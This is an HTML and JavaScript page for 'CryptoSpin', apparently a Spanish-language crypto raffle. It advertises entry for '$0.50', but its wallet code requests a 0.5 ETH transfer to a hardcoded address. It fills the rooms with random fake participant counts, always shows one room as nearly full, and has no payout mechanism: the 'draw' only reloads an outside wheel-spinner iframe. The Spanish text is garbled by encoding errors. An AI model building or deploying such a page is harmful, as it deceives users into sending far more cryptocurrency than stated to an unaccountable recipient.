<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>CryptoSpin - Sorteos en Cripto</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
</head>
<body class="bg-gray-900 text-white">
  <header class="p-4 bg-gray-800 text-center text-2xl font-bold">CryptoSpin</header>

  <main class="p-6">
    <section class="mb-6">
      <h2 class="text-xl font-semibold mb-2">Bienvenido a CryptoSpin</h2>
      <p>Participa en salas de sorteo autom√°ticas y gana premios en criptomonedas.</p>
    </section>

    <!-- Buscador de salas -->
    <div class="mb-6">
      <input type="text" id="searchInput" placeholder="Buscar sala por n√∫mero..." class="w-full p-2 rounded text-black" />
    </div>

    <section id="rooms" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
      <!-- Aqu√≠ se insertar√°n las salas din√°micamente -->
    </section>
  </main>

  <footer class="p-4 bg-gray-800 text-center">&copy; 2025 CryptoSpin. Todos los derechos reservados.</footer>

  <script>
    const roomsContainer = document.getElementById("rooms");
    const searchInput = document.getElementById("searchInput");
    const roomsData = [];

    const extraInfoHTML = `
      <div class="ml-4 text-sm space-y-1 max-w-xs">
        <p class="font-bold text-green-400">GANA $50 CON $0,50</p>
        <p>3 ENTRE 200 | ¬°Bienvenido! al Sorteo por Participaci√≥n en donde tendr√°s 3 Oportunidades para ¬°GANAR!</p>
        <p class="font-semibold">>>SER√ÅN 3 GIROS<<</p>
        <p>GIRO1Ô∏è‚É£ $10</p>
        <p>GIRO2Ô∏è‚É£ $10</p>
        <p>GIRO3Ô∏è‚É£ $50 üèÜ</p>
        <p class="font-bold">¬°QUE GANE EL MEJOR!</p>
      </div>
    `;

    function createRoom(id, participants = 0) {
      const room = document.createElement("div");
      room.className = "bg-gray-700 rounded-xl p-4 shadow-xl room";
      room.setAttribute("data-id", id);
      room.setAttribute("data-participants", participants);

      const numberOptions = Array.from({length: 200}, (_, i) => `<option value="${i + 1}">${i + 1}</option>`).join("");

      room.innerHTML = `
        <div class="flex items-center justify-between mb-2">
          <h3 class="text-lg font-bold flex items-center gap-2">Sala #${id}</h3>
          ${extraInfoHTML}
        </div>
        <p>Participantes: <span class="participant-count">${participants}</span> / 200</p>
        <select class="w-full mt-2 text-black p-2 rounded number-selector-${id}">
          <option value="" disabled selected>Elige tu n√∫mero (1 - 200)</option>
          ${numberOptions}
        </select>
        <button onclick="connectWallet(${id})" class="mt-2 bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded-full">Unirse por $0.50</button>
        <iframe
          id="wheel-${id}"
          src="https://wheelofnames.com/bh2-bm6?spin=0"
          width="400"
          height="400"
          style="pointer-events: none; margin-top:20px; border-radius: 12px; border: 2px solid #4ade80;"
        ></iframe>
      `;

      roomsContainer.appendChild(room);
      roomsData.push({ id, participants });
    }

    function populateRooms() {
      for (let i = 1; i <= 10; i++) {
        const randomParticipants = (i === 1) ? 199 : Math.floor(Math.random() * 199);
        createRoom(i, randomParticipants);
      }
    }

    async function connectWallet(roomId) {
      const selector = document.querySelector(`.number-selector-${roomId}`);
      const selectedNumber = selector.value;

      if (!selectedNumber) {
        alert("Por favor elige un n√∫mero disponible.");
        return;
      }

      if (typeof window.ethereum !== 'undefined') {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
          const wallet = accounts[0];

          const transactionParameters = {
            to: '0x659a0f0D27378c9f25B97B0fE0F0df6fD1a6D3d4',
            from: wallet,
            value: (0.5 * 1e18).toString(16), // 0.50 ETH o el equivalente seg√∫n red
          };

          await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [transactionParameters],
          });

          alert(`¬°Te has unido a la Sala #${roomId} con el n√∫mero ${selectedNumber}!`);

          const roomEl = document.querySelector(`.room[data-id='${roomId}'] .participant-count`);
          let newCount = parseInt(roomEl.textContent) + 1;
          roomEl.textContent = newCount;

          if (newCount >= 200) {
            setTimeout(() => {
              spinWheel(roomId);
            }, 2000);
          }

        } catch (err) {
          alert("Error al conectar o enviar: " + err.message);
        }
      } else {
        alert("Por favor instala MetaMask para unirte.");
      }
    }

    function spinWheel(roomId) {
      const iframe = document.getElementById(`wheel-${roomId}`);
      const src = iframe.src;
      iframe.src = ""; // Reset para recargar
      setTimeout(() => {
        iframe.src = src.includes("?") ? `${src}&spin=1` : `${src}?spin=1`;
      }, 300);
    }

    searchInput.addEventListener("input", (e) => {
      const value = e.target.value.toLowerCase();
      document.querySelectorAll(".room").forEach(room => {
        const roomId = room.getAttribute("data-id");
        room.style.display = roomId.includes(value) ? "block" : "none";
      });
    });

    populateRooms();
  </script>
</body>
</html>
